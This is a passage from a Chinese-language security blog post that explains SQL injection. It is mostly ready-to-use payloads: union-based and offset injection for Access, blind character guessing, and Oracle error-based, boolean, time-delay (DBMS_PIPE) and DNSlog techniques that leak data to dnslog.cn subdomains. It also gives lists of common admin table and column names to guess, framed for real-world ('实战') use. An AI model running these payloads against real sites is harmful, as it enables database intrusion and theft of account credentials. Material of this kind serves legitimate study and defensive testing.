<p><a target="_blank" rel="noopener" href="http://www.example.com/new/_list.asp?id=1">http://www.example.com/new\_list.asp?id=1</a> and 1&#x3D;2 #页面报错</p>
<p>猜字段： 1 order by 4 报错 1 order by 3 正确</p>
<h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a>有回显：</h3><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示 2、3）</p>
<p>查列：and exists (select 列名 from 表名) （假设存在 user、password）</p>
<p>?id&#x3D;3 and exists (select * from test)</p>
<p>?id&#x3D;3 and exists (select * from admin)</p>
<p>?id&#x3D;3 and exists (select name from admin) 报错，说明不存在</p>
<p>?id&#x3D;3 and exists (select username from admin) 说明存在 username</p>
<p>?id&#x3D;3 and exists (select password from admin) 说明存在 password</p>
<p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p>
<p>?id&#x3D;-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p>
<h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a>无回显：</h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p>
<p>查列：and exists (select 列名 from 表名)</p>
<p>查内容：and (select top 1 asc(mid(user,1,1))from admin)&#x3D;97</p>
<p>and (select top 1 asc(mid(user,2,1))from admin)&#x3D;97 猜字段 (username) 中第一条记录内容的第二个字符</p>
<p>and (select top 2 asc(mid(user,1,1))from admin)&#x3D;97 猜字段 (username) 中第二条记录内容的第一个字符</p>
<h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a>偏移注入（回显数连续）</h3><p>假设已经判断存在 admin 表，order by 下判断有 35 行，且回显如下回显字段连续</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765814_62cf7fb6ed96ca3d6341d.png!small"></p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin – 返回错误页面</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin – 返回错误页面</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin – 返回错误页面</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin – 返回到一个错误页面提示查询语句出错，因此 admin 表的列数为 6</p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p>
<p>因为回显如下图 28 29 30 是连着的，直接在 27 后加表名.*</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765836_62cf7fcc12b6e7da878c0.png!small"></p>
<p>爆出内容  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765847_62cf7fd738ed7ab7c3339.png!small"></p>
<p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id &#x3D; 3 添加 where id &#x3D; 数值，可得到更多的内容</p>
<h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a>偏移注入（常规操作）</h3><p>Access 偏移注入：表名知道，列名无法获取的情况下。</p>
<p>存在注入点，且 order by 下判断出字段数为 22 行</p>
<p><strong>爆出显位</strong></p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p>
<p>***** <strong>号判断直到页面错误有变化</strong></p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p>
<p>说明 admin 有 6 个字段</p>
<p><strong>Access**** 偏移注入</strong>，基本公式为：</p>
<p>order by 出的字段数减去 * 号的字段数，然而再用 order by 的字段数减去 2 倍刚才得出来的答案；</p>
<p>也就是：</p>
<p>* &#x3D; 6 个字符</p>
<p>2 × * &#x3D; 12 个字符</p>
<p>22 - 12 &#x3D; 10 个字符</p>
<p>一级偏移语句：</p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id &#x3D; b.id)</p>
<p>二级偏移语句：</p>
<p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id &#x3D; b.id)inner join admin as c on a.id&#x3D;c.id)</p>
<p>实战常见的表和列（也可以用 sqlmap 的，但是量大且效率低）</p>
<p>常见的表有（最后根据企业名的缩写搭配上 admin、user、name）</p>
<p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p>
<p>admin_id、admin_name、admin_password</p>
<p>常见的列</p>
<p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name 等等</p>
<p>oracle 注入 (jsp)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765866_62cf7fea9f4e6948d11dd.png!small"></p>
<h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a>常规有回显注入</h2><p>order by 3–</p>
<p>and 1&#x3D;2 union select null,null,null from dual–</p>
<p>and 1&#x3D;2 union select ‘null’,null,null from dual– &#x2F;&#x2F; 返回正常，则第一个字段是数字型，返回错误，为字符型</p>
<p>and 1&#x3D;2 union select 1,’2’,’3’ from dual– &#x2F;&#x2F; 判断显示位</p>
<p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual– &#x2F;&#x2F; 探测数据库版本信息</p>
<p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual– &#x2F;&#x2F; 查询第一个表名</p>
<p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;’STUDENT’),null from dual– &#x2F;&#x2F; 第二个表名</p>
<p>获取关键表中的列名：</p>
<p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and rownum&#x3D;1),null from dual –</p>
<p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’and column_name&lt;&gt;’SUSER’ and rownum&#x3D;1),null from dual –</p>
<p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’and column_name&lt;&gt;’SUSER’and column_name&lt;&gt;’SPWD’ and rownum&#x3D;1),null from dual –</p>
<p>‘union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’and column_name&lt;&gt;’SUSER’and column_name&lt;&gt;’SPWD’and column_name&lt;&gt;’SNAME’ and rownum&#x3D;1),null from dual –</p>
<p>and 1&#x3D;2 union select SNAME,SUSER,SPWD from T_USER where id&#x3D;1– &#x2F;&#x2F; 查看数据</p>
<h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a>第二种常规注入</h3><p>确定回显位，假设当前共 2 个字段，全是数字型，判断方式如下：<br>and 1&#x3D;2 union select 1,2 from dual　　假设回显位是 2，爆当前数据库中的第一个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1) from dual　　爆当前数据库中的第二个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第 n 个表<br>爆某表中的第一个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1&#x3D;2 union select 1, 字段 1|| 字段 2…|| 字段 n from 表名 where rownum&#x3D;1 – 连接多个字段用到的连接符号是 ||, 在 oracle 数据库中，concat 函数只能连接两个字符串</p>
<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 utl_inaddr.get_host_name<br>这种方法在 Oracle 8g，9g，10g 中不需要任何权限，但是在 Oracle 11g 以及以后的版本中，当前数据库用户必须有网络访问权限。</p>
<p>jsp?name&#x3D;’ and 1&#x3D;utl_inaddr.get_host_name((select user from dual)) –</p>
<p>ctxsys.drithsx.sn()</p>
<p>jsp?name&#x3D;’ and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual)) –</p>
<p>dbms_xdb_version.checkin()</p>
<p>jsp?name&#x3D;1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p>
<p>dbms_utility.sqlid_to_sqlhash()</p>
<p>jsp?name&#x3D;1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null –</p>
<p>XMLType()</p>
<p>sname&#x3D;1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null –</p>
<h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsp?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765888_62cf80001865e22a5f8e0.png!small"></p>
<p>username&#x3D;admin’and (select substr(user, 1, 1) from dual)&#x3D;’S’ –</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要用 DBMS_PIPE.RECEIVE_MESSAGE</p>
<p>即 user 的第一位是 “A” 时，延时 5 秒执行。</p>
<p>And 1&#x3D;(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p>
<p>第二位是 D 时，延时 5 秒</p>
<p>And 1&#x3D;(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p>
<p>news.jsp?id&#x3D;1 and 1&#x3D;(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p>
<h3 id="DNSlog-注入"><a href="#DNSlog-注入" class="headerlink" title="DNSlog 注入"></a>DNSlog 注入</h3><p>utl_inaddr.get_host_address</p>
<p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p>
<p>SYS.DBMS_LDAP.INIT 这个函数在 10g&#x2F;11g 中是 public 权限.</p>
<p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p>
<p>借鉴大佬博客：<a target="_blank" rel="noopener" href="https://www.yuque.com/aufeng/aufeng/_good/iganif#zoa46">https://www.yuque.com/aufeng/aufeng\_good/iganif#zoa46</a></p>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h2 id="Sqlite-注入"><a href="#Sqlite-注入" class="headerlink" title="Sqlite 注入"></a>Sqlite 注入</h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p>
<p>1.Sqlite-master: 这个是内置系统表、相当于 mysql 的 information_schema</p>
<p>但是这里只存有表的信息，里面有个 sql 字段，有各个表的结构，有表名，字段名和类型</p>
<p>2.sqlite 并不支持像 mysql 那样的注释，但是可以通过 — 方式增加 DDL 注释 (写 shell 会用到)</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hackzkaq/article/details/117119953">https://blog.csdn.net/hackzkaq/article/details/117119953</a></p>
<h2 id="Postsql-注入"><a href="#Postsql-注入" class="headerlink" title="Postsql 注入"></a>Postsql 注入</h2><p>PostgreSQL 是一种特性非常齐全的自由软件的对象 - 关系型数据库管理系统（ORDBMS），4.2 版本为基础的对象关系型数据库管理系统。</p>
<p>PostgreSQL 安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p>
<ul>
<li><p>注释符：–</p>
</li>
<li><p>延时函数：pg_sleep(3)</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765907_62cf8013ada166b4cf32d.png!small"></p>
<p>可参考谢公子的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq/_36119192/article/details/104628797">https://blog.csdn.net/qq\_36119192/article/details/104628797</a></p>
<h2 id="Oracle-注入"><a href="#Oracle-注入" class="headerlink" title="Oracle 注入"></a>Oracle 注入</h2><p><code>基础知识</code><br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用 dual，dual 是 Oracle 的虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条记录。</p>
<p>Oracle 的数据类型是强匹配的 (MYSQL 有弱匹配的味道)，所以在 Oracle 进行类似 UNION 查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用 null 代替某些无法快速猜测出数据类型的位置。</p>
<p>参考文档学习：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin/_42508548/article/details/121516504">https://blog.csdn.net/weixin\_42508548/article/details/121516504</a></p>
<p>总结: 本文主要是对 Owasp-top10–sql 注入的学习整理，参考了一些大佬的文章，还尚有不足，需要多加学习，望大佬们多多支持。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img02.anzhiy.cn/adminuploads/1/2022/09/15/63232b7d91d22.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img02.anzhiy.cn/adminuploads/1/2022/09/15/63232b7d91d22.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Jack hou</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/')">SQL注入详解</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div><div class="reward-link mode"><a class="reward-link-button" href="/wechat/"><i class="anzhiyufont anzhiyu-icon-plant-fill"></i>运营模式与责任</a></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL注入详解&amp;url=http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/&amp;pic=https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.houyanbin.com" target="_blank">Jackhou Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>安全<span class="tagsPageCount">20</span></a><a class="post-meta__box__tags" href="/tags/SQL/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>SQL<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/21/%E5%AE%89%E5%85%A8/Ubuntu%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Ubuntu 虚拟机安装教程</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/21/%E5%AE%89%E5%85%A8/Centos7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Centos7 超详细安装教程</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/05/24/%E5%AE%89%E5%85%A8/sqlmap%E4%BD%BF%E7%94%A8/" title="Sqlmap使用"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-05-24</div><div class="title">Sqlmap使用</div></div></a></div><div><a href="/2023/04/10/Articles/Security%20Copilot%20%E5%88%86%E6%9E%90/" title="Security Copilot 分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-10</div><div class="title">Security Copilot 分析</div></div></a></div><div><a href="/2023/05/04/Articles/APT%E7%BB%84%E7%BB%87/" title="APT 组织介绍"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-05-04</div><div class="title">APT 组织介绍</div></div></a></div><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/Burp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" title="Burp使用技巧"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">Burp使用技巧</div></div></a></div><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/" title="CSRF跨站请求伪造攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">CSRF跨站请求伪造攻击</div></div></a></div><div><a href="/2023/04/21/%E5%AE%89%E5%85%A8/Centos7%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" title="Centos7 超详细安装教程"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-04-21</div><div class="title">Centos7 超详细安装教程</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://img02.anzhiy.cn/adminuploads/1/2022/09/15/63232b7d91d22.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">Hi，这是我的博客网站，欢迎你能到访~</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">我会在这里分享我的<b style="color:#fff">技术知识</b>、<b style="color:#fff">日常生活</b>和<b style="color:#fff">人生经验。</b></div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Jack hou</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/Hou-yanbin" target="_blank" title="Github"><i class="fab fa-github faa-tada"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/478589474" target="_blank" title="BiliBili"><i class="fa-brands fa-bilibili faa-tada"></i></a><a class="social-icon faa-parent animated-hover" href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=jackhou921@qq.com" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wxgzh1.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81sql-%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">一、sql 注入概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AF%BB%E6%89%BE-sql-%E6%B3%A8%E5%85%A5"><span class="toc-text">二、寻找 sql 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81sql-%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">三、sql 注入的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql-%E6%B3%A8%E5%85%A5"><span class="toc-text">Mysql 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5"><span class="toc-text">普通注入</span></a></li><li class="toc-item 